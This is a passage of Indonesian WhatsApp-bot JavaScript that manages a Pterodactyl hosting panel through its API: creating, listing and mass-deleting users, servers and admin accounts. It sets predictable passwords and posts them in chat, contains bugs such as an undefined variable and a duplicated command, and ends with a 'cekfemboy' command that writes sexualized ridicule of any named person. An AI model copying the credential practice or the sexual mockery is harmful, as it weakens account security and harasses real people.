let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await sock.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

case "deladminv2": case "deladpv2": {
if (!isAn) return m.reply(mess.owner)
if (!args[0]) return m.reply(example(`id nya\n\nuntuk melihat id admin ketik *${prefix}listadmin*`))
let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(global.domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
m.reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break

case "listadminv2": case "listadpv2": {
if (!isAn) return m.reply(mess.owner)
let cek = await fetch(global.domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = "*List all admin panel*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `  ⚪ ID User : *${i.attributes.id}*
   📍 Nama : *${i.attributes.first_name}*\n\n`
})
m.reply(teks)
}
break

  case "clearpanelv2": case "clearserverv2": { 
if (!isAn) return reply(mess.owner)
await reply(`*Memproses penghapusan semua user & server panel ⚠️*`)
try {
const headers = {
  "Authorization": "Bearer " + global.apikeyV2,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

async function getUsers() {
  try {
    const res = await axios.get(`${global.domainV2}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
    reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

async function getServers() {
  try {
    const res = await axios.get(`${global.domainV2}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${global.domainV2}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
  }
}
async function deleteUser(userID) {
  try {
    await axios.delete(`${global.domainV2}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
  }
}
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0
  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Lewati admin: ${user.attributes.username}`);
      continue; // Lewati admin
    }
    const userID = user.attributes.id;
    const userEmail = user.attributes.email;
    console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);
    // Cari server yang dimiliki user ini
    const userServers = servers.filter(srv => srv.attributes.user === userID);
    // Hapus semua server user ini
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }
    // Hapus user setelah semua servernya terhapus
    await deleteUser(userID);
  }
await reply(`*Finished Cleaning the Panel ✅*

- Total *${totalSrv}* (user & server) panel dihapus 

*⚠️ Server yang dihapus bukan admin panel*`)
}
// Jalankan fungsi
return deleteNonAdminUsersAndServers();
} catch (err) {
return reply(`${JSON.stringify(err, null, 2)}`)
}
}
break

case "addserver": case "addsrv": {
  if (!isAn) return m.reply(mess.owner)
  if (!text) return m.reply(example(`id,nama,ram\nKetik: *${prefix}listpanel* untuk melihat id`));
  let [usr_id, nama, ramInput] = text.split(",");
  if (!usr_id || !nama || !ramInput) return m.reply(example(`id,nama,ram\nKetik: *${prefix}listpanel* untuk melihat id`));
  usr_id = usr_id.trim();
  nama = nama.trim();
  ramInput = ramInput.trim().toLowerCase();

  let ram, disknya, cpu;

  if (["unli", "unlimited"].includes(ramInput)) {
    ram = disknya = cpu = 0;
  } else if (/^\d+gb$/.test(ramInput)) {
    const gb = parseInt(ramInput.replace("gb", ""));
    if (gb < 1 || gb > 10) return reply("RAM hanya boleh dari 1GB sampai 10GB atau 'unli'");
    ram = gb * 1000;
    disknya = gb * 1000;
    cpu = 20 + (gb * 20); // contoh: 1gb = 40%, 2gb = 60%, dst
  } else {
    return reply("Format RAM salah. Gunakan seperti: 1gb - unli");
  }

  const desc = tanggal(Date.now());

  const getEgg = await fetch(`${global.domainV2}/api/application/nests/${nestid}/eggs/${egg}`, {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${global.apikeyV2}`
    }
  });

  const eggData = await getEgg.json();
  const startup_cmd = eggData.attributes.startup;

  const createServer = await fetch(`${global.domainV2}/api/application/servers`, {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${global.apikeyV2}`
    },
    body: JSON.stringify({
      name: nama,
      description: desc,
      user: parseInt(usr_id),
      egg: parseInt(egg),
      docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
      startup: startup_cmd,
      environment: {
        INST: "npm", USER_UPLOAD: "0",
        AUTO_UPDATE: "0", CMD_RUN: "npm start"
      },
      limits: {
        memory: parseInt(ram),
        swap: 0,
        disk: parseInt(disknya),
        io: 500,
        cpu: parseInt(cpu)
      },
      feature_limits: { databases: 5, backups: 5, allocations: 5 },
      deploy: {
        locations: [parseInt(loc)],
        dedicated_ip: false,
        port_range: [],
      },
    })
  });

  const result = await createServer.json();

  if (result.errors) return reply("Gagal menambah server:\n" + JSON.stringify(result.errors[0], null, 2));
  const server = result.attributes;

  let teks = `*Succes Create New Server ✅*
- User ID : ${usr_id}
- Server ID : ${server.id}
- Nama Server : ${nama}

*Server Specifications 🖥️*
- Ram : ${ram == 0 ? "Unlimited" : `${ram / 1000}GB`}
- Disk : ${disknya == 0 ? "Unlimited" : `${disknya / 1000}GB`}
- CPU : ${cpu == 0 ? "Unlimited" : cpu + "%"}`;

  await sock.sendMessage(m.chat, { text: teks, contextInfo: { isForwarded: true } }, { quoted: m });
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isAn && !isGrupPrem) return m.reply('Only owner dan grup dengan akses Reseller')
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+"990"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
${global.teksPanel}
`
await fs.writeFileSync("akunpanel.txt", teks)
await sock.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "listpanel": case "listp": case "listserver": {
if (!isAn) return m.reply(mess.owner)
if (!global.apikey) return m.reply("Apikey tidak ditemukan!\nPastikan di settings.js *global.apikey* sudah di isi!")
let page = 1
let allServers = []
  while (true) {
    let res = await fetch(`${global.domain}/api/application/servers?page=${page}`, {
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${global.apikey}`
      }
    })

    let data = await res.json()
    if (!data.data || data.data.length === 0) break

    allServers.push(...data.data)

    if (!data.meta?.pagination || page >= data.meta.pagination.total_pages) break
    page++
  }

  if (!allServers.length) return m.reply("Tidak ada server panel.")

  let teks = `*List all server panel*\n> #Total: *${allServers.length} server*\n\n`
  let no = 1

  for (let srv of allServers) {
    let s = srv.attributes
    let uuid = s.uuid.split("-")[0]
    let status = "unknown"

    try {
      let res = await fetch(`${global.domain}/api/client/servers/${uuid}/resources`, {
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${global.capikey}`
        }
      })
      let json = await res.json()
      status = json.attributes?.current_state?.toUpperCase() || "unknown"
    } catch (e) {
      status = "unknown"
    }

    teks += `┣𖣠 ID Server : *${s.id}*\n`
    teks += `┣𖣠 ID User : *${s.user}*\n`
    teks += `┣𖣠 Nama : *${s.name}*\n`
    teks += `┣𖣠 RAM : *${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"}*\n`
    teks += `┣𖣠 Status : *${status}*\n\n`
  }
  return sock.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case "delpanel":
case "delp": {
  if (!isAn) return m.reply(mess.owner)
  if (global.apikey.length < 1) return m.reply("Apikey tidak ditemukan!\nPastikan di settings.js *global.apikey* sudah di isi!")
  if (!args[0]) return m.reply(example(`id servernya\n\nuntuk melihat id server ketik *${prefix}listpanel*`))

  let f = await fetch(global.domain + "/api/application/servers?page=1", {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikey
    }
  })
  let result = await f.json()
  let servers = result.data
  let deletedUserId = null
  let deletedServerName = null

  for (let server of servers) {
    let s = server.attributes
    if (args[0] == s.id.toString()) {
      deletedUserId = s.user // <-- ambil user ID dari server
      deletedServerName = s.name

      // Hapus server
      await fetch(global.domain + `/api/application/servers/${s.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + global.apikey
        }
      })
    }
  }
  if (!deletedUserId) return m.reply("*ID Server* Tidak Ditemukan")
  // Hapus user berdasarkan user ID
  await fetch(global.domain + `/api/application/users/${deletedUserId}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikey
    }
  })
  m.reply(`Berhasil Menghapus Akun Panel *${capital(deletedServerName)}* (Server & User)`)
}
break

case "cadmin": case "cadp": {
if (!isAn) return m.reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@epic.com"
let name = capital(args[0])
let password = username+"001"
let f = await fetch(global.domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Yours admin panel 📦*
* *ID User :* ${user.id}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling Script
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* No rusuh`
await sock.sendMessage(orang, {
  text: teks,
  contextInfo: { isForwarded: true }
}, { quoted: m });
}
break

case "cadmin2": {
if (!isAn) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+"001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await sock.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

case "deladmin": case "deladp": {
if (!isAn) return m.reply(mess.owner)
if (!args[0]) return m.reply(example(`id nya\n\nuntuk melihat id admin ketik *${prefix}listadmin*`))
let cek = await fetch(global.domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(global.domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
m.reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break

case "listadmin": case "listadp": {
if (!isWaz) return m.reply(mess.owner)
let cek = await fetch(global.domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = "*List all admin panel*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += ` ⚪ ID User : *${i.attributes.id}*
   📍 Nama : *${i.attributes.first_name}*\n\n`
})
m.reply(teks)
}
break

case "hpsallserver": case "clearpanel": case "clearserver": { 
if (!isAn) return reply(mess.owner)
await reply(`*Memproses penghapusan semua user & server panel ⚠️*`)
try {
const headers = {
  "Authorization": "Bearer " + global.apikey,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

async function getUsers() {
  try {
    const res = await axios.get(`${global.domain}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
    reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

async function getServers() {
  try {
    const res = await axios.get(`${global.domain}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${global.domain}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
  }
}
async function deleteUser(userID) {
  try {
    await axios.delete(`${global.domain}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
  }
}
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0
  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Lewati admin: ${user.attributes.username}`);
      continue; // Lewati admin
    }
    const userID = user.attributes.id;
    const userEmail = user.attributes.email;
    console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);
    // Cari server yang dimiliki user ini
    const userServers = servers.filter(srv => srv.attributes.user === userID);
    // Hapus semua server user ini
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }
    // Hapus user setelah semua servernya terhapus
    await deleteUser(userID);
  }
await reply(`*Finished Cleaning the Panel ✅*

- Total *${totalSrv}* (user & server) panel dihapus 

*⚠️ Server yang dihapus bukan admin panel*`)
}
// Jalankan fungsi
return deleteNonAdminUsersAndServers();
} catch (err) {
return reply(`${JSON.stringify(err, null, 2)}`)
}
}
break

case "addserver": case "addsrv": {
  if (!isAn) return m.reply(mess.owner)
  if (!text) return m.reply(example(`id,nama,ram\nKetik: *${prefix}listpanel* untuk melihat id`));
  let [usr_id, nama, ramInput] = text.split(",");
  if (!usr_id || !nama || !ramInput) return m.reply(example(`id,nama,ram\nKetik: *${prefix}listpanel* untuk melihat id`));
  usr_id = usr_id.trim();
  nama = nama.trim();
  ramInput = ramInput.trim().toLowerCase();

  let ram, disknya, cpu;

  if (["unli", "unlimited"].includes(ramInput)) {
    ram = disknya = cpu = 0;
  } else if (/^\d+gb$/.test(ramInput)) {
    const gb = parseInt(ramInput.replace("gb", ""));
    if (gb < 1 || gb > 10) return reply("RAM hanya boleh dari 1GB sampai 10GB atau 'unli'");
    ram = gb * 1000;
    disknya = gb * 1000;
    cpu = 20 + (gb * 20); // contoh: 1gb = 40%, 2gb = 60%, dst
  } else {
    return reply("Format RAM salah. Gunakan seperti: 1gb - unli");
  }

  const desc = tanggal(Date.now());

  const getEgg = await fetch(`${global.domain}/api/application/nests/${nestid}/eggs/${egg}`, {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${global.apikey}`
    }
  });

  const eggData = await getEgg.json();
  const startup_cmd = eggData.attributes.startup;

  const createServer = await fetch(`${global.domain}/api/application/servers`, {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${global.apikey}`
    },
    body: JSON.stringify({
      name: nama,
      description: desc,
      user: parseInt(usr_id),
      egg: parseInt(egg),
      docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
      startup: startup_cmd,
      environment: {
        INST: "npm", USER_UPLOAD: "0",
        AUTO_UPDATE: "0", CMD_RUN: "npm start"
      },
      limits: {
        memory: parseInt(ram),
        swap: 0,
        disk: parseInt(disknya),
        io: 500,
        cpu: parseInt(cpu)
      },
      feature_limits: { databases: 5, backups: 5, allocations: 5 },
      deploy: {
        locations: [parseInt(loc)],
        dedicated_ip: false,
        port_range: [],
      },
    })
  });

  const result = await createServer.json();

  if (result.errors) return reply("Gagal menambah server:\n" + JSON.stringify(result.errors[0], null, 2));
  const server = result.attributes;

  let teks = `*Succes Create New Server ✅*
- User ID : ${usr_id}
- Server ID : ${server.id}
- Nama Server : ${nama}

*Server Specifications 🖥️*
- Ram : ${ram == 0 ? "Unlimited" : `${ram / 1000}GB`}
- Disk : ${disknya == 0 ? "Unlimited" : `${disknya / 1000}GB`}
- CPU : ${cpu == 0 ? "Unlimited" : cpu + "%"}`;

  await sock.sendMessage(m.chat, { text: teks, contextInfo: { isForwarded: true } }, { quoted: m });
}
break;
// ======== RANDOM MENU =========== //
case "cekkaya": {

if (!text) return m.reply(example("nama"))
let who = m.mentionedJid[0] 
? m.mentionedJid[0] 
: m.quoted 
? m.quoted.sender 
: m.sender;
let kayaList = [
    "*kekayaan : lu mah kismin*",
    "*kekayaan : berduit dikit*",
    "*kekayaan : kere 7 turunan*",
    "*kekayaan : sekaya raffi ahmad*",
    "*kekayaan : crazy rich😱*",
    "*kekayaan : miskin*",
    "*kekayaan : lumayan kaya*",
    "*kekayaan : punya mobil 1*",
    "*kekayaan : kaya tapi jelek*",
    "*kekayaan : udah jelek miskin*",
    "*kekayaan : yang kaya ortunya anaknya kismin*",
    "*kekayaan : sederhana*",
];
let pickRandom = (list) => list[Math.floor(Math.random() * list.length)];
let khodam = pickRandom(kayaList);
let name = await getName(sock, m.sender)

m.reply(`*Hasil Pencarian Kekayaan*\n-------------------------------------------\n- *nama : ${text}*\n- ${kaya}\n\n> kalo mau kaya kerja ya anj, jangan main hp mulu`, { mentions: [who] });
    }
     break;
 
   case 'tekateki': {

    const soalList = [
    { soal: "Aku punya leher tapi tidak punya kepala. Siapakah aku?", jawaban: "baju" },
    { soal: "Makin malam makin terang, aku apa?", jawaban: "bulan" },
    { soal: "Aku bisa menghilang saat kau sebut namaku. Siapa aku?", jawaban: "hening" },
    { soal: "Apa yang bisa naik tapi tidak turun?", jawaban: "umur" },
    { soal: "Apa yang selalu datang tapi tak pernah tiba?", jawaban: "besok" },
    { soal: "Aku punya kaki tapi tidak bisa berjalan. Apakah aku?", jawaban: "meja" },
    { soal: "Apa yang selalu basah saat mengeringkan?", jawaban: "handuk" },
    { soal: "Benda apa yang dilempar malah kembali?", jawaban: "boomerang" },
    { soal: "Benda apa yang kalau dipakai tetap dingin?", jawaban: "kipas" },
    { soal: "Kenapa ayam menyeberang jalan?", jawaban: "karena ingin ke seberang" },
    { soal: "Apa yang bulat, kecil, tapi bikin orang pusing?", jawaban: "utang" },
    { soal: "Apa yang bisa dilihat tapi tidak bisa disentuh?", jawaban: "bayangan" },
    { soal: "Semakin banyak diambil, semakin besar. Apakah aku?", jawaban: "lubang" },
    { soal: "Aku selalu bersama kamu tapi kamu gak bisa pegang aku. Apa aku?", jawaban: "bayangan" },
    { soal: "Aku bisa terbang tanpa sayap dan bisa jatuh tanpa terluka. Apa aku?", jawaban: "waktu" },
    { soal: "Apa yang bisa memanjat tapi tidak punya kaki?", jawaban: "suara" },
    { soal: "Semua orang punya tapi tak bisa dilihat. Apakah aku?", jawaban: "pikiran" },
    { soal: "Benda apa yang tiap hari dibuka tutup tapi tidak marah?", jawaban: "pintu" },
    { soal: "Apa yang bisa masuk rumah tanpa izin?", jawaban: "udara" },
    { soal: "Apa yang gak bisa dilihat tapi bisa dirasakan?", jawaban: "angin" },
    { soal: "Apa yang selalu kamu bawa tapi gak pernah kamu lihat?", jawaban: "punggung" },
    { soal: "Aku bisa nyala tanpa api. Aku apa?", jawaban: "lampu" },
    { soal: "Apa yang kalau berdiri dia miring, tapi kalau tidur dia lurus?", jawaban: "pensil" },
    { soal: "Apa yang warnanya putih tapi bukan kapas?", jawaban: "awan" },
    { soal: "Aku lahir dari api, tapi aku basah. Siapakah aku?", jawaban: "abu" },
    { soal: "Apa yang bisa berputar tapi tidak jalan?", jawaban: "kipas angin" },
    { soal: "Apa yang kalau disimpan dia hilang?", jawaban: "rahasia" },
    { soal: "Apa yang bisa mengikat tapi tidak kelihatan?", jawaban: "janji" },
    { soal: "Aku selalu di belakang kamu, tapi kamu gak bisa lihat aku. Apa aku?", jawaban: "masa lalu" },
    { soal: "Apa yang selalu benar tapi jarang dipercaya?", jawaban: "logika" },
    { soal: "Aku punya tangan tapi gak punya jari. Siapa aku?", jawaban: "jam" }
];
    let soalAcak = soalList[Math.floor(Math.random() * soalList.length)];
    global.tekatekiJawaban = soalAcak.jawaban.toLowerCase();

    m.reply(`❓ *Teka-Teki Waktu Santai!*\n\n*Soal:* ${soalAcak.soal}\n\nKetik *.jawabteka [jawaban kamu]*`);
}
break;

case 'jawabteka': {

    if (!global.tekatekiJawaban) return m.reply("⚠️ Belum ada teka-teki yang aktif. Ketik *.tekateki* dulu!");

    const jawabanUser = text.toLowerCase().trim();
    if (jawabanUser === global.tekatekiJawaban) {
        m.reply("✅ *Bener cuy!* Pinter juga kepala lu!");
    } else {
        m.reply(`❌ *Salah!*\nClue: Jawabannya ${global.tekatekiJawaban.length} huruf.`);
    }
}
break;      

case 'cekfemboy': {

    if (!text) return m.reply('Masukin nama dulu, biar bisa gue nilai... seberapa layak lo dibisik "malam ini kamu punyaku ya~".');

    let target = text || m.pushName;

    const hash = Array.from(target).reduce((acc, char) => acc + char.charCodeAt(0), 0);
    const percent = Math.floor((hash * Date.now()) % 101);

    let rank = '';
    if (percent >= 95) {
        rank = 'UKE LEGENDARIS';
    } else if (percent >= 85) {
        rank = 'FEMBOY HOTLINE';
    } else if (percent >= 70) {
        rank = 'FEMBOY SIAGA 1';
    } else if (percent >= 50) {
        rank = 'FEMBOY NGEFLIRT';
    } else if (percent >= 30) {
        rank = 'FEMBOY TERPENDAM';
    } else {
        rank = 'TARGET FANTASI';
    }

    let komentar = '';
    if (percent >= 95) {
        komentar = 'Lo tuh femboy idaman sugar daddy. Dikit aja dikasih perhatian, langsung manja-manja sambil meringkuk di dada orang. Suara lo? ASMR-nya ngegoda setengah mati.';
    } else if (percent >= 85) {
        komentar = 'Dari cara lo ngetik aja udah kebaca: lo suka dipeluk dari belakang sambil dibisikin pelan. "Udah siap buat nakal belum?" dan lo cuma bisa ngangguk pelan.';
    } else if (percent >= 70) {
        komentar = 'Lo bukan cuma femboy... lo tuh pemicu dosa. Outfit lo selalu kebetulan *nempel banget*. Bikin yang lihat pengen langsung tarik dan bilang "ayo, kamar kosong ada nih."';
    } else if (percent >= 50) {
        komentar = 'Lo diem-diem horny. Di luar keliatan kalem, tapi pas malem sendirian, lo buka headset, pasang playlist "moan compilation", dan... ya, lo ngerti sendiri lanjutannya.';
    } else if (percent >= 30) {
        komentar = 'Aura lo tuh "aku malu, tapi mau". Sering banget dikira polos, padahal tab bookmark lo isinya *doujin* dan video-videonya full dengan tag yang... gak bisa dijelasin di sini.';
    } else {
        komentar = 'Lo bukan femboy. Tapi lo punya muka yang sering jadi thumbnail video "cowok straight dibikin leleh sama trap". Dan lo nonton... sampe habis. Diam-diam ngulang 3x.';
    }

    const notes = [
        'Note: Stop nyari "femboy gets bred" di search bar, lo ketauan.',
        'Note: Lo tuh bukan innocent, lo cuman belum ke-ekspos aja.',
        'Note: Lo suka bilang "iya kak..." pas voice? Jangan sok malu deh.',
        'Note: History lo isinya lebih orno dari VPN premium.',
        'Note: Lo udah bukan wibu biasa, lo tuh femboy enjoyer tingkat advance.',
        'Note: Kalau explore IG lo isinya cowok berseragam ketat... lo udah tau lah.',
    ];

    const pickNote = notes[Math.floor(Math.random() * notes.length)];

    m.reply(`👤 *${target}*\n🏅 *RANK:* ${rank}\n🔞 *${percent}% Femboy Power*\n\n${komentar}\n\n${pickNote}`);
}
break
        

case "cekkontol": {

